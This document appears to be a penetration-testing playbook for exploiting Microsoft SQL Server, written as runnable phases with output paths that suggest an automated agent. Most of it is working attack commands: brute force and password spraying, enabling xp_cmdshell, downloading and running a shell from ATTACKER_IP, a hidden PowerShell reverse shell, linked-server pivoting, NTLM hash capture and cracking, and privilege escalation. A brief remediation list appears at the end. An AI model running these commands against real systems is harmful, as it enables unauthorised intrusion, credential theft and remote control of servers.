# Microsoft SQL Server Exploitation

## Overview
MSSQL exploitation techniques: enumeration, authentication attacks, xp_cmdshell RCE,
linked servers, UNC path injection for hash capture, and privilege escalation.

## Prerequisites
```bash
pip install impacket
apt-get install -y nmap sqsh crackmapexec
# MSSQL default port: 1433
```

## Phase 1: Enumeration

### Nmap Service Detection
```bash
nmap -sV -p 1433 TARGET -oN /workspace/output/TARGET_mssql_nmap.txt

# NSE scripts for MSSQL
nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info TARGET \
  -oN /workspace/output/TARGET_mssql_info.txt

# Enumerate SQL instances (UDP 1434)
nmap -sU -p 1434 --script ms-sql-info TARGET

# Dump MSSQL tables/columns if authenticated
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password='' TARGET
nmap -p 1433 --script ms-sql-query \
  --script-args 'ms-sql-query.query="SELECT name FROM sys.databases",mssql.username=sa' TARGET
```

### CrackMapExec Enumeration
```bash
# Basic connectivity check
crackmapexec mssql TARGET -u sa -p '' --local-auth

# Enumerate users with valid creds
crackmapexec mssql TARGET -u administrator -p 'Password123' -d TARGET_DOMAIN
crackmapexec mssql TARGET -u '' -p '' --local-auth   # null session attempt
```

## Phase 2: Authentication Attacks

### Brute Force
```bash
# Hydra MSSQL brute force
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt \
  TARGET mssql -t 4 -o /workspace/output/TARGET_mssql_brute.txt

# CrackMapExec spray
crackmapexec mssql TARGET -u users.txt -p passwords.txt --no-bruteforce \
  2>&1 | tee /workspace/output/TARGET_mssql_spray.txt

# Impacket brute
for pass in Password1 Password123 Sa123456 Admin123; do
  python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
    sa:$pass@TARGET -windows-auth 2>&1 | grep -i "logged in\|error"
done
```

## Phase 3: Impacket mssqlclient

### Basic Connection
```bash
# SQL authentication
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  sa:'P@ssw0rd'@TARGET

# Windows authentication
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  DOMAIN/Administrator:'Password123'@TARGET -windows-auth

# Through port forwarding
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  sa:'P@ssw0rd'@127.0.0.1 -port 1433
```

### sqsh Alternative
```bash
sqsh -S TARGET -U sa -P 'P@ssw0rd' -D master
# Inside sqsh:
# 1> SELECT @@VERSION
# 2> go
```

## Phase 4: xp_cmdshell RCE

```bash
# Enable xp_cmdshell (requires sysadmin)
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:'P@ssw0rd'@TARGET <<'EOF'
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EOF

# Execute commands via xp_cmdshell
# Inside mssqlclient:
# SQL> xp_cmdshell 'whoami'
# SQL> xp_cmdshell 'ipconfig /all'
# SQL> xp_cmdshell 'net user'

# One-liner execution
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  sa:'P@ssw0rd'@TARGET -q "EXEC xp_cmdshell 'whoami'"

# Download and execute reverse shell
# SQL> xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe'
# SQL> xp_cmdshell 'C:\Windows\Temp\shell.exe'

# PowerShell reverse shell via xp_cmdshell
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:'P@ssw0rd'@TARGET <<'SQLEOF'
EXEC xp_cmdshell 'powershell -nop -w hidden -e <BASE64_PAYLOAD>';
SQLEOF
```

## Phase 5: Linked Servers

```bash
# Enumerate linked servers (inside mssqlclient)
# SQL> SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
# SQL> EXEC sp_linkedservers;

# Execute query on linked server
# SQL> SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@VERSION')
# SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

# Chain through multiple linked servers
# SQL> EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINKED2]') AT [LINKED1]

# Dump all linked server data
nmap -p 1433 --script ms-sql-query \
  --script-args 'ms-sql-query.query="EXEC sp_linkedservers",mssql.username=sa,mssql.password=P@ssw0rd' \
  TARGET > /workspace/output/TARGET_linked_servers.txt
```

## Phase 6: UNC Path Injection (Hash Capture)

```bash
# Start Responder to capture NTLM hashes
responder -I eth0 -wrf &

# Trigger UNC path request from MSSQL (inside mssqlclient)
# SQL> EXEC xp_dirtree '\\ATTACKER_IP\share'
# SQL> EXEC xp_fileexist '\\ATTACKER_IP\share\test'
# SQL> EXEC master..xp_subdirs '\\ATTACKER_IP\share\'

# Capture hash in /workspace/output/
cp /usr/share/responder/logs/*.txt /workspace/output/TARGET_mssql_hashes.txt

# Crack captured NTLM hash
hashcat -m 5600 /workspace/output/TARGET_mssql_hashes.txt /usr/share/wordlists/rockyou.txt \
  -o /workspace/output/TARGET_cracked_hashes.txt
```

## Phase 7: Privilege Escalation

### Trustworthy Database Abuse
```bash
# Inside mssqlclient — check trustworthy databases
# SQL> SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

# Escalate via TRUSTWORTHY db + sp_executesql
# SQL> USE <TRUSTWORTHY_DB>;
# SQL> CREATE PROCEDURE evil_sp WITH EXECUTE AS OWNER AS
# SQL>   EXEC master.dbo.sp_addsrvrolemember 'sa_new_user','sysadmin'
# SQL> EXEC evil_sp
```

### Impersonation Attacks
```bash
# Check who can be impersonated
# SQL> SELECT distinct b.name FROM sys.server_permissions a
# SQL>   INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
# SQL>   WHERE a.permission_name = 'IMPERSONATE';

# Execute as different login
# SQL> EXECUTE AS LOGIN = 'sa';
# SQL> SELECT SYSTEM_USER;   -- should show sa
# SQL> EXEC xp_cmdshell 'whoami';

# Revert impersonation
# SQL> REVERT;
```

### Token Stealing via CLR
```bash
# Enable CLR (if disabled)
# SQL> EXEC sp_configure 'clr enabled', 1;
# SQL> RECONFIGURE;

# Create malicious CLR assembly
# Requires pre-compiled DLL — see PowerUpSQL for automation
```

## Phase 8: CrackMapExec MSSQL Module

```bash
# Execute command via CME
crackmapexec mssql TARGET -u sa -p 'P@ssw0rd' -x 'whoami' \
  2>&1 | tee /workspace/output/TARGET_cme_exec.txt

# PowerShell execution
crackmapexec mssql TARGET -u sa -p 'P@ssw0rd' -X 'Get-Process' \
  2>&1 >> /workspace/output/TARGET_cme_exec.txt

# Module: mssql_priv (check/escalate privileges)
crackmapexec mssql TARGET -u sa -p 'P@ssw0rd' -M mssql_priv
```

## Report Template

```
Target: TARGET (Port 1433)
MSSQL Version: <from @@VERSION>
Authentication: SQL / Windows

## Critical Findings
- [ ] xp_cmdshell enabled / enableable (RCE)
- [ ] Linked servers exploitable for lateral movement
- [ ] UNC path injection — NTLM hash captured
- [ ] Impersonation of privileged login possible
- [ ] Brute-forced SA credential

## Commands Executed
whoami output: <output>
Hostname: <hostname>

## Captured Hashes
<NTLMv2 hash>

## Recommendations
1. Disable xp_cmdshell
2. Use Windows Authentication only
3. Block outbound SMB from SQL server (prevent UNC hash theft)
4. Enforce strong SA password or disable SA account
5. Audit linked servers and restrict execution
6. Disable TRUSTWORTHY on all user databases
```

## Output Files
- `/workspace/output/TARGET_mssql_nmap.txt` — Nmap MSSQL enumeration
- `/workspace/output/TARGET_mssql_brute.txt` — Brute force results
- `/workspace/output/TARGET_mssql_hashes.txt` — Captured NTLM hashes
- `/workspace/output/TARGET_linked_servers.txt` — Linked server list
- `/workspace/output/TARGET_cme_exec.txt` — CME execution output

indicators: mssql, sql, server, xp_cmdshell, linked, server, mssqlclient, unc, path, injection, sqsh, crackmapexec, impacket, impersonation, trustworthy, ntlm, hash, capture, brute
